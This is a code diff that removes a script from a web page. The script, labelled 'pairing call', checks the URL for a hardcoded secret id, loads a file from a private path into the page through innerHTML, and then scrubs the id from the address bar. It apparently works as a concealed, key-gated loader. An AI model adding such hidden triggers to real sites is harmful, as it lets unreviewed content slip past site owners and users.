@@ -436,35 +436,5 @@ $(document).ready(function(){
         });
     </script>
 
-
-<!-- pairing call -->
-  <div id="pairingbox">
-    </div>
-        <script>
-        function getQueryParam(param) {
-            let params = new URLSearchParams(window.location.search);
-            return params.get(param);
-        }
-
-        window.onload = function() {
-            let id = getQueryParam('id');
-            let random = getQueryParam('random');
-
-            if (id === 'GhkgigssoDnwbaw' && random) {
-                fetch('priv/GhkgigssoDnwbaw.js')
-                    .then(response => response.text())
-                    .then(data => {
-                        document.getElementById('pairingbox').innerHTML = data;
-
-                        // Generate new random string and update URL without reloading the page
-                        const newRandomString = Math.random().toString(36).substring(2, 15);
-                        const newUrl = `${window.location.pathname}?random=${newRandomString}`;
-                        window.history.replaceState({}, '', newUrl);
-                    })
-                    .catch(error => console.log('Error:', error));
-            }
-        };
-    </script>
-
 </body>
 </html>
